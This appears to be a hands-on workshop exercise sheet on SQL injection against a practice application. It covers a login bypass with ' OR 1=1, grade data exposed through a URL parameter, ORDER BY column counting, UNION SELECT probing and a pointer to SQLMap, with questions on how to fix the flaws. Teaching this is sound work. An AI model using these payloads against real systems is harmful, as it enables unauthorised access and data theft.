## SQL Injection
A SQL injection attack is performed when an attacker attempts to pass bad data to the application in hope that it will be injected into a SQL query.
For example, when attempting to login, it can be guessed that the query should look somewhat like
"SELECT * FROM USERS WHERE USERNAME='" + username + "' AND PASSWORD='" + password + "'"

If the attacker would then enter the username admin and password helloworld, the complete query would be
"SELECT * FROM USERS WHERE USERNAME='admin' AND PASSWORD='helloworld'"

By realising how a query is built, the attacker could instead pass username admin and password ' OR 1=1; --'

#### Questions
1. What would the resulting query be for the injection attack?
2. What does the attack query do and how can it be used?
3. Can you find any place in the application where you can use this attack?
4. How can you fix it in the code?

## Display information using SQL injection
Sometimes information is retrieved from a SQL query and displayed in the client.
If there is a sql vulnerability, this can be exploited into showing unintended data, such as internal database information

This is most common in GET requests where information is retrieved based a parameter, such as user id. Let's take the example where grades are retrieved by user id.
Endpoint: .../grades?user=admin
Resulting backend query: "SELECT * FROM GRADES WHERE USERNAME='admin'"

If the attacker would then instead change the user to "admin' OR 1=1 --'", the result would be
Endpoint: .../grades?user=' OR 1=1 --'
Resulting backend query: "SELECT * FROM GRADES WHERE USERNAME='admin' OR 1=1 --''"

If the page load is properly loaded, there is a high risk for a SQL vulnerability. We can then check how many columns the queried table has:
.../grades?user=admin' ORDER BY 3 --'   # Page loads correctly, sorted according the 3 column
.../grades?user=admin' ORDER BY 5 --'   # Page loads correctly, sorted according the 5 column
.../grades?user=admin' ORDER BY 6 --'   # Fails! We only have 5 columns

We can then query the type of each column by selecting values that we think are matching types
.../grades?user=admin' UNION SELECT null, null, null, null, null --'   # Start with only null, change one at a time
.../grades?user=admin' UNION SELECT 1, null, 3, 'TEST', 'ABC' --'      # Change data types as long as server does not crash

#### Questions
1. What could be interesting to list in such attacks?
2. How would an attack SQL query look like?
3. Is there any special metadata that can be queried for important information?
4. Can you find a page with this weakness in the application?
5. How do you solve it?

## SQL Map
SQL is a utility that can be used to perform automatic advanced SQL attacks against a system.
A tool that might come handy is SQLMap. The image details page looks suitable.

**More usage....**

## (Solutions)
The vulnerability can be investigated for example in JPAUserRepository or JPAImageRepository.java. Try to study the code first and then try exploiting the application

